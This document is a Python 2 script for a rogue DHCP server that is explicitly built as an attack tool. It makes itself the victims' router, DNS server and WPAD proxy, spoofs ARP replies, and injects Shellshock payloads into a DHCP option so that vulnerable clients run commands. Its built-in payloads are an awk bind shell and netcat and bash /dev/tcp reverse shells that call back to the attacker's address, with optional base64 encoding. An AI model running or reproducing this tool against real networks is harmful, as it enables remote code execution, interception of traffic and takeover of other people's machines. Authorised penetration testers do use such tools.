#!/usr/bin/env python

from base import Base
from network import Ethernet_raw, DHCP_raw
from sys import exit
from argparse import ArgumentParser
from ipaddress import IPv4Address
from scapy.all import Ether, ARP, BOOTP, DHCP, sniff
from socket import socket, AF_PACKET, SOCK_RAW, inet_aton
from base64 import b64encode
from struct import pack
from netaddr import IPAddress

Base.check_user()
Base.check_platform()

cINFO = '\033[0;34m'
cERROR = '\033[0;31m'
cSUCCESS = '\033[0;32m'
cEND = '\033[0m'

_info = cINFO + '[*]' + cEND + ' '
_error = cERROR + '[-]' + cEND + ' '
_success = cSUCCESS + '[+] ' + cEND + ' '

parser = ArgumentParser(description='DHCP Rogue server')

parser.add_argument('-i', '--interface', help='Set interface name for send reply packets')
parser.add_argument('-f', '--first_offer_ip', type=str, help='Set first client ip for offering', default='192.168.0.2')
parser.add_argument('-l', '--last_offer_ip', type=str, help='Set last client ip for offering', default='192.168.0.253')
parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address', default=None)
parser.add_argument('-I', '--target_ip', type=str, help='Set client IP address with MAC in --target_mac', default=None)

parser.add_argument('-c', '--shellshock_command', type=str, help='Set shellshock command in DHCP client')
parser.add_argument('-b', '--bind_shell', action='store_true', help='Use awk bind tcp shell in DHCP client')
parser.add_argument('-p', '--bind_port', type=int, help='Set port for listen bind shell (default=1234)', default=1234)
parser.add_argument('-N', '--nc_reverse_shell', action='store_true', help='Use nc reverse tcp shell in DHCP client')
parser.add_argument('-E', '--nce_reverse_shell', action='store_true', help='Use nc -e reverse tcp shell in DHCP client')
parser.add_argument('-R', '--bash_reverse_shell', action='store_true', help='Use bash reverse tcp shell in DHCP client')
parser.add_argument('-e', '--reverse_port', type=int, help='Set port for listen bind shell (default=443)', default=443)
parser.add_argument('-n', '--without_network', action='store_true', help='Do not add network configure in payload')
parser.add_argument('-B', '--without_base64', action='store_true', help='Do not use base64 encode in payload')

parser.add_argument('-O', '--shellshock_option_code', type=int,
                    help='Set dhcp option code for inject shellshock payload, default=114', default=114)

parser.add_argument('--ip_path', type=str,
                    help='Set path to "ip" in shellshock payload, default = /bin/', default="/bin/")

parser.add_argument('--iface_name', type=str,
                    help='Set iface name in shellshock payload, default = eth0', default="eth0")

parser.add_argument('--dhcp_mac', type=str, help='Set DHCP server MAC address, if not set use your MAC address')
parser.add_argument('--dhcp_ip', type=str, help='Set DHCP server IP address, if not set use your IP address')
parser.add_argument('--router', type=str, help='Set router IP address, if not set use your ip address')
parser.add_argument('--netmask', type=str, help='Set network mask, if not set use your netmask')
parser.add_argument('--broadcast', type=str, help='Set network broadcast, if not set use your broadcast')
parser.add_argument('--dns', type=str, help='Set DNS server IP address, if not set use your ip address')
parser.add_argument('--lease_time', type=int, help='Set lease time, default=172800', default=172800)
parser.add_argument('--domain', type=str, help='Set domain name for search, default=test.com', default="test.com")
parser.add_argument('--proxy', type=str, help='Set proxy', default=None)

args = parser.parse_args()

eth = Ethernet_raw()
dhcp = DHCP_raw()

current_network_interface = None
target_mac_address = None
target_ip_address = None
offer_ip_address = None
dhcp_server_mac_address = None
dhcp_server_ip_address = None
router_ip_address = None
network_mask = None
network_broadcast = None
dns_server_ip_address = None
number_of_dhcp_request = 0
shellshock_url = None
proxy = None
domain = None
payload = None

if args.interface is None:
    current_network_interface = Base.netiface_selection()
else:
    current_network_interface = args.interface

args.target_mac = str(args.target_mac).lower()

if args.target_ip is not None:
    target_ip_address = args.target_ip

your_mac_address = Base.get_netiface_mac_address(current_network_interface)
if your_mac_address is None:
    print _error + "Network interface: " + current_network_interface + " do not have MAC address!"
    exit(1)

your_ip_address = Base.get_netiface_ip_address(current_network_interface)
if your_ip_address is None:
    print _error + "Network interface: " + current_network_interface + " do not have IP address!"
    exit(1)

your_netmask = Base.get_netiface_netmask(current_network_interface)
if your_netmask is None:
    print _error + "Network interface: " + current_network_interface + " do not have network mask!"
    exit(1)

your_broadcast = Base.get_netiface_broadcast(current_network_interface)
if your_broadcast is None:
    print _error + "Network interface: " + current_network_interface + " do not have broadcast!"
    exit(1)

if args.dhcp_mac is None:
    dhcp_server_mac_address = your_mac_address
else:
    dhcp_server_mac_address = args.dhcp_mac

if args.dhcp_ip is None:
    dhcp_server_ip_address = your_ip_address
else:
    dhcp_server_ip_address = args.dhcp_ip

if args.router is None:
    router_ip_address = your_ip_address
else:
    router_ip_address = args.router

if args.netmask is None:
    network_mask = your_netmask
else:
    network_mask = args.netmask

if args.broadcast is None:
    network_broadcast = your_broadcast
else:
    network_broadcast = args.broadcast

if args.dns is None:
    dns_server_ip_address = your_ip_address
else:
    dns_server_ip_address = args.dns

if 255 < args.shellshock_option_code < 0:
    print _error + "Bad value in DHCP option code! This value should be in the range from 1 to 255"
    exit(1)

print "\r\n"
print _info + "Network interface: " + cINFO + current_network_interface + cEND
print _info + "First offer IP: " + cINFO + args.first_offer_ip + cEND
print _info + "Last offer IP: " + cINFO + args.last_offer_ip + cEND
print _info + "DHCP server mac address: " + cINFO + dhcp_server_mac_address + cEND
print _info + "DHCP server ip address: " + cINFO + dhcp_server_ip_address + cEND
print _info + "Router IP address: " + cINFO + router_ip_address + cEND
print _info + "Network mask: " + cINFO + network_mask + cEND
print _info + "DNS server IP address: " + cINFO + dns_server_ip_address + cEND
print "\r\n"


def make_dhcp_offer_packet(transaction_id):
    return dhcp.make_response_packet(source_mac=dhcp_server_mac_address,
                                     destination_mac=target_mac_address,
                                     source_ip=dhcp_server_ip_address,
                                     destination_ip="255.255.255.255",
                                     transaction_id=transaction_id,
                                     your_ip=offer_ip_address,
                                     client_mac=target_mac_address,
                                     dhcp_server_id=dhcp_server_ip_address,
                                     lease_time=args.lease_time,
                                     netmask=network_mask,
                                     router=router_ip_address,
                                     dns=dns_server_ip_address,
                                     dhcp_operation=2,
                                     payload=None)


def make_dhcp_ack_packet(transaction_id, requested_ip):
    return dhcp.make_response_packet(source_mac=dhcp_server_mac_address,
                                     destination_mac=target_mac_address,
                                     source_ip=dhcp_server_ip_address,
                                     destination_ip=requested_ip,
                                     transaction_id=transaction_id,
                                     your_ip=requested_ip,
                                     client_mac=target_mac_address,
                                     dhcp_server_id=dhcp_server_ip_address,
                                     lease_time=args.lease_time,
                                     netmask=network_mask,
                                     router=router_ip_address,
                                     dns=dns_server_ip_address,
                                     dhcp_operation=5,
                                     payload=shellshock_url,
                                     proxy=proxy,
                                     domain=domain,
                                     payload_option_code=args.shellshock_option_code)


def make_dhcp_nak_packet(transaction_id, requested_ip):
    return dhcp.make_nak_packet(source_mac=dhcp_server_mac_address,
                                destination_mac=target_mac_address,
                                source_ip=dhcp_server_ip_address,
                                destination_ip=requested_ip,
                                transaction_id=transaction_id,
                                your_ip=offer_ip_address,
                                client_mac=target_mac_address,
                                dhcp_server_id=dhcp_server_ip_address)


def dhcp_reply(request):
    global offer_ip_address
    global target_mac_address
    global target_ip_address
    global number_of_dhcp_request
    global shellshock_url
    global domain
    global your_mac_address

    SOCK = socket(AF_PACKET, SOCK_RAW)
    SOCK.bind((current_network_interface, 0))

    if request.haslayer(DHCP):

        domain = bytes(args.domain)
        offer_ip_address = args.first_offer_ip

        transaction_id = request[BOOTP].xid
        target_mac_address = ":".join("{:02x}".format(ord(c)) for c in request[BOOTP].chaddr[0:6])

        if request[DHCP].options[0][1] == 1:
            if target_ip_address is not None:
                offer_ip_address = target_ip_address
            else:
                next_offer_ip_address = IPv4Address(unicode(args.first_offer_ip)) + number_of_dhcp_request
                if IPv4Address(next_offer_ip_address) < IPv4Address(unicode(args.last_offer_ip)):
                    number_of_dhcp_request += 1
                    offer_ip_address = str(next_offer_ip_address)
                else:
                    number_of_dhcp_request = 0
                    offer_ip_address = args.first_offer_ip

            print _info + "DHCP DISCOVER from: " + target_mac_address + " || transaction id: " + \
                hex(transaction_id) + " || offer ip: " + offer_ip_address

            offer_packet = make_dhcp_offer_packet(transaction_id)
            SOCK.send(offer_packet)
            print _info + "Send offer response!"

        if request[DHCP].options[0][1] == 8:
            ciaddr = request[BOOTP].ciaddr
            giaddr = request[BOOTP].giaddr
            chaddr = request[BOOTP].chaddr
            flags = request[BOOTP].flags

            print _info + "DHCP INFORM from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
                " || client ip: " + ciaddr

            option_operation = pack("!3B", 53, 1, 5)  # DHCPACK operation
            option_netmask = pack("!" "2B" "4s", 1, 4, inet_aton(network_mask))

            domain = pack("!%ds" % (len(domain)), domain)
            option_domain = pack("!2B", 15, len(domain)) + domain

            option_router = pack("!" "2B" "4s", 3, 4, inet_aton(router_ip_address))
            option_dns = pack("!" "2B" "4s", 6, 4, inet_aton(dns_server_ip_address))

            option_server_id = pack("!" "2B" "4s", 54, 4, inet_aton(dhcp_server_ip_address))  # Set server id
            option_end = pack("B", 255)

            dhcp_options = option_operation + option_server_id + option_netmask + option_domain + option_router + \
                           option_dns + option_end

            dhcp = DHCP_raw()
            ack_packet = dhcp.make_packet(ethernet_src_mac=dhcp_server_mac_address,
                                          ethernet_dst_mac=target_mac_address,
                                          ip_src=dhcp_server_ip_address,
                                          ip_dst=ciaddr,
                                          udp_src_port=67, udp_dst_port=68,
                                          bootp_message_type=2,
                                          bootp_transaction_id=transaction_id,
                                          bootp_flags=int(flags),
                                          bootp_client_ip=ciaddr,
                                          bootp_your_client_ip="0.0.0.0",
                                          bootp_next_server_ip="0.0.0.0",
                                          bootp_relay_agent_ip=giaddr,
                                          bootp_client_hw_address=target_mac_address,
                                          dhcp_options=dhcp_options,
                                          padding=18)

            SOCK.send(ack_packet)
            print _info + "Send inform ack response!"

        if request[DHCP].options[0][1] == 3:
            requested_ip = offer_ip_address
            for option in request[DHCP].options:
                if option[0] == "requested_addr":
                    requested_ip = str(option[1])

            print _info + "DHCP REQUEST from: " + target_mac_address + " || transaction id: " + \
                hex(transaction_id) + " || requested ip: " + requested_ip

            if target_ip_address is not None:
                if requested_ip != target_ip_address:
                    nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip)
                    SOCK.send(nak_packet)
                    print _info + "Send nak response!"

            else:
                if IPv4Address(unicode(requested_ip)) < IPv4Address(unicode(args.first_offer_ip)) \
                        or IPv4Address(unicode(requested_ip)) > IPv4Address(unicode(args.last_offer_ip)):

                    nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip)
                    SOCK.send(nak_packet)
                    print _info + "Send nak response!"

                else:
                    net_settings = args.ip_path + "ip addr add " + requested_ip + \
                                   "/" + str(IPAddress(network_mask).netmask_bits()) + " dev " + args.iface_name + ";"

                    global payload

                    if args.shellshock_command is not None:
                        payload = args.shellshock_command

                    if args.bind_shell:
                        payload = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
                                  "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &"

                    if args.nc_reverse_shell:
                        payload = "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
                                  your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"

                    if args.nce_reverse_shell:
                        payload = "/bin/nc -e /bin/sh " + your_ip_address + " " + str(args.reverse_port) + " 2>&1 &"

                    if args.bash_reverse_shell:
                        payload = "/bin/bash -i >& /dev/tcp/" + your_ip_address + \
                                  "/" + str(args.reverse_port) + " 0>&1 &"

                    if payload is not None:

                        if not args.without_network:
                            payload = net_settings + payload

                        if args.without_base64:
                            shellshock_url = "() { :" + "; }; " + payload
                        else:
                            payload = b64encode(payload)
                            shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + payload + ")"

                    if shellshock_url is not None:
                        if len(shellshock_url) > 255:
                            print _error + "Len of command is very big! Current len: " + str(len(shellshock_url))
                            shellshock_url = "A"

                    global proxy
                    if args.proxy is None:
                        proxy = bytes("http://" + dhcp_server_ip_address + ":8080/wpad.dat")
                    else:
                        proxy = bytes(args.proxy)

                    ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
                    SOCK.send(ack_packet)
                    print _info + "Send ack response!"

    if request.haslayer(ARP):
        if target_ip_address is not None:
            if request[ARP].op == 1:
                if request[Ether].dst == "ff:ff:ff:ff:ff:ff" and request[ARP].hwdst == "00:00:00:00:00:00":
                    print _info + "Gratuitous ARP MAC: " + request[ARP].hwsrc + " IP: " + request[ARP].pdst
                    if request[ARP].pdst != target_ip_address:
                        arp_reply = Ether(dst=request[ARP].hwsrc, src=your_mac_address) \
                                    / ARP(hwsrc=your_mac_address, psrc=request[ARP].pdst,
                                          hwdst=request[ARP].hwsrc, pdst=request[ARP].psrc, op=2)
                        SOCK.send(arp_reply)
                        print _info + "Send ARP response!"
                    else:
                        print _success + "MiTM success!"
                        print "\r\n"
                        print _success + "Target MAC: " + cSUCCESS + target_mac_address + cEND
                        print _success + "Target IP: " + cSUCCESS + target_ip_address + cEND
                        print "\r\n"
                        SOCK.close()
                        exit(0)

    SOCK.close()


if __name__ == "__main__":
    if args.target_ip is not None:
        if args.target_mac is None:
            print _error + "Please set target MAC address (--target_mac 00:AA:BB:CC:DD:FF)"
            exit(1)
        else:
            print _info + "Waiting for ARP, DHCP DISCOVER, DHCP REQUEST or DHCP INFORM from " + args.target_mac + " ..."
            sniff(lfilter=lambda d: d.src == args.target_mac,
                  filter="arp or (udp and src port 68 and dst port 67)",
                  prn=dhcp_reply, iface=current_network_interface)
    else:
        if args.target_mac is None:
            print _info + "Waiting for a DHCP DISCOVER, DHCP REQUEST or DHCP INFORM ..."
            sniff(lfilter=lambda d: d.src != eth.get_mac_for_dhcp_discover() and
                                    d.src != Base.get_netiface_mac_address(current_network_interface),
                  filter="udp and src port 68 and dst port 67 and dst host 255.255.255.255",
                  prn=dhcp_reply, iface=current_network_interface)
        else:
            print _info + "Waiting for a DHCP DISCOVER, DHCP REQUEST or DHCP INFORM from " + args.target_mac + " ..."
            sniff(lfilter=lambda d: d.src == args.target_mac,
                  filter="udp and src port 68 and dst port 67",
                  prn=dhcp_reply, iface=current_network_interface)

